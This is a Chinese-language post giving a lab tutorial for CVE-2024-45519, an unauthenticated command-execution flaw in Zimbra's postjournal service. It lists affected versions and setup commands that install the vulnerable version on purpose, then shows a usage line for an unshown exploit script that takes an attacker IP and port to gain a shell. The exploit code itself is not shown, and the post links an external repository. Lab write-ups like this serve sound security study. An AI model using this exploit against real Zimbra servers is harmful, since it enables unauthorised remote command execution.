#  【PoC】CVE-2024-45519 - Zimbra Postjournal 漏洞利用教程   
 独眼情报   2024-10-06 09:35  
  
#    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnQTqACGARdtXISOmchnQlxvdJic7QtXjOSEra4F7Hq3TJachaSliciaZInjVsR3h1eRh0PELDe1doAibQ/640?wx_fmt=png&from=appmsg "")  
## 描述 ⚠️  
  
CVE-2024-45519 是 Zimbra Collaboration (ZCS) 中的一个漏洞，允许未认证的用户通过 postjournal 服务执行命令。本指南将引导您设置实验室环境以重现此问题并执行漏洞利用。  
## 受影响的版本 🐛  
- **Joule**: 版本 8.8.15  
  
- **Kepler**: 版本 9.0.0  
  
- **Daffodil**: 版本 10.0.x 在 10.0.9 之前的版本  
  
- **Daffodil**: 版本 10.1.0  
  
## 实验室设置 🖥️  
1. **准备测试环境**确保您的实验室机器上运行的是 Ubuntu 20.04.6 LTS (Focal Fossa)。示例测试环境：Ubuntu 20.04.6 LTS。  
  
1. **下载 Zimbra**运行以下命令下载并解压 Zimbra Collaboration 包：  
```
sudo su
wget https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz
tar -xvzf zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz
cd zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220

```  
  
  
1. **配置主机名**将主机名设置为 zimbra.labo：  
```
hostnamectl set-hostname zimbra.labo

```  
  
  
1. **安装 Zimbra**请按照此处的安装指南操作 👉 Zimbra 安装指南。当提示使用 Zimbra 的包存储库时，请选择 **No**。  
  
1. **替换易受攻击的 postjournal 二进制文件**结束掉正在运行的 postjournal 进程并用易受攻击的二进制文件替换它：  
```
sudo pkill postjournal
dpkg-deb -x packages/zimbra-core_8.8.15.GA.4177.UBUNTU20.64_amd64.deb /tmp/zimbra-core
sudo cp /tmp/zimbra-core/opt/zimbra/libexec/postjournal /opt/zimbra/libexec/postjournal

```  
  
  
1. **启用并重启 Zimbra 服务**以 zimbra 用户身份登录并启用 postjournal 服务：  
```
sudo su - zimbra
zmlocalconfig -e postjournal_enabled=true
zmcontrol restart

```  
  
  
## 漏洞利用使用方法 🚀  
  
一旦实验室设置并运行完毕，您可以使用漏洞利用来利用该漏洞。  
### 步骤：  
1. **准备漏洞利用脚本**确保漏洞利用脚本（假设您已经准备好了）针对正确的 IP 地址和端口。  
  
1. **运行漏洞利用脚本**执行漏洞利用脚本来针对易受攻击的 Zimbra 实例。例如，使用您的脚本：  
```
python exploit.py <target> -lh <attacker-ip> -lp <attacker-port> -p <smtp-port>

```  
  
  
1. **享受您的 shell**一旦漏洞利用成功连接，您将在 Zimbra 服务器上获得命令执行权限！🎉  
  
## 参考资料 🔗  
- Zimbra CVE-2024-45519 - Cyberveille eSante  
  
- Zimbra 远程代码执行博客 - ProjectDiscovery  
  
## 免责声明 ⚠️  
  
此漏洞利用和指南仅用于教育目的。请负责任地使用此信息，仅在您有明确权限测试的系统上使用。未经授权的系统利用是非法且不道德的。作者，贡献者和本公众号不对因使用此信息而造成的任何误用或损害负责。  
  
> https://github.com/Chocapikk/CVE-2024-45519  
  
  
  
  
